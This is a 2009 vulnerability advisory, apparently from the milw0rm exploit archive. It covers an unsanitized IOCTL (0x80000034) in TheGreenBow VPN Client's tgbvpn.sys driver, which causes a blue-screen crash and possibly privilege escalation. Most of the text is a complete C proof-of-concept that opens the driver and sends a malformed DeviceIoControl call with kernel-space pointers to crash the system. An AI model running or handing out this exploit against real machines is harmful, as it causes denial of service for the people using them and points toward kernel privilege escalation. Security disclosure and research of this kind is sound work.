@@ -1,0 +1,89 @@
+Author: Giuseppe 'Evilcry' Bonfa'
+E-Mail: evilcry {AT} GMAIL {DOT} COM
+Website: http://evilcry.netsons.org
+             http://evilcodecave.blogspot.com
+             http://evilcodecave.wordpress.com
+             http://evilfingers.com
+             http://malwareAnalytics.com [under construction]
+
+Release Date: 15/08/2009
+
++-------------------------------------------------+
+Product: TheGreenBow VPN Client 4.61.003  (other versions could be affected)
+Affected Component: tgbvpn.sys
+Category: Local Denial of Service (BSOD)
+         (untested) Local Privilege Escalation
+
++-------------------------------------------------+
+
+
+
+--------------------------[Details]--------------->
+
+TheGreenBow's tgbvpn.sys Driver does not sanitize user supplied input
+(IOCTL)
+and this lead to a Driver Collapse that propagates on the system with a
+BSOD,
+and potential risk of Privilege Escalation.
+
+Affected IOCTL is 0x80000034
+
+Transfer Type: METHOD_BUFFERED
+
+STACK_TEXT:
+WARNING: Stack unwind information not available. Following frames may be
+wrong.
+ef1cabf4 841d36a8 ef1cac58 841d36a8 f42dd895 tgbvpn+0x9f51
+00000000 00000000 00000000 00000000 00000000 0x841d36a8
+
+
++--------------------------------------------------------------------------------------------+
+/* tgbvpn.sys KERNEL_MODE_EXCEPTION_NOT_HANDLED - DoS PoC
+ *
+ * Author: Giuseppe 'Evilcry' Bonfa'
+ * E-Mail: evilcry {AT} gmail. {DOT} com
+ * Website: http://evilcry.netsons.org
+ * http://evilcodecave.blogspot.com
+ * http://evilcodecave.wordpress.com
+ * http://evilfingers.com
+ * http://malwareAnalytics.com [under construction]
+ */
+
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(void)
+{
+   HANDLE hDevice;
+   DWORD Junk;
+
+
+
+   system("cls");
+   printf("\n .:: TheGreenBow DoS Proof of Concept ::.\n");
+
+   hDevice = CreateFileA("\\\\.\\tgbvpn",
+                       0,
+                       FILE_SHARE_READ | FILE_SHARE_WRITE,
+                       NULL,
+                       OPEN_EXISTING,
+                       0,
+                       NULL);
+
+   if (hDevice == INVALID_HANDLE_VALUE)
+   {
+       printf("\n Unable to Device Driver\n");
+       return EXIT_FAILURE;
+   }
+
+   DeviceIoControl(hDevice, 0x80000034,(LPVOID) 0x80000001, 0, (LPVOID)
+0x80000002, 0, &Junk, (LPOVERLAPPED)NULL);
+
+
+   return EXIT_SUCCESS;
+}
+
++--------------------------------------------------------------------------------------------+
+
+# milw0rm.com [2009-08-18]
